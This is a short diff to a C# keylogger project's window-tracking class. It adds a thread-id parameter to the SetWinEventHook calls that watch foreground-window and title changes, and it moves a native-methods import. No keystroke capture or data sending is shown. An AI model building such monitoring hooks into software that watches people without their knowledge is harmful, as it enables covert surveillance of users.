@@ -2,8 +2,8 @@
 using System.ComponentModel;
 using System.Runtime.InteropServices;
 using System.Text;
+using KeyBoardHook.Common.Native;
 using KeyBoardHook.KeyLogger.Entity;
-using KeyBoardHook.KeyLogger.Native;
 
 namespace KeyBoardHook.KeyLogger.Hooker
 {
@@ -59,13 +59,13 @@ namespace KeyBoardHook.KeyLogger.Hooker
             return NativeMethods.GetWindowText(handle, buff, nChars) > 0 ? buff.ToString() : null;
         }
 
-        public void Hook()
+        public void Hook(IntPtr tId)
         {
 
             if (_hookHandleWinChange==IntPtr.Zero)
                 _hookHandleWinChange = NativeMethods.SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
                     IntPtr.Zero,
-                    WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
+                    WinEventProc, 0, tId, WINEVENT_OUTOFCONTEXT);
                 
             
             if (_hookHandleWinChange == IntPtr.Zero)
@@ -77,7 +77,7 @@ namespace KeyBoardHook.KeyLogger.Hooker
             if (_hookHandleTitleChange==IntPtr.Zero)
                 _hookHandleTitleChange = NativeMethods.SetWinEventHook(EVENT_OBJECT_NAMECHANGE, EVENT_OBJECT_NAMECHANGE,
                     IntPtr.Zero,
-                    WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
+                    WinEventProc, 0, tId, WINEVENT_OUTOFCONTEXT);
 
             if (_hookHandleTitleChange == IntPtr.Zero)
             {
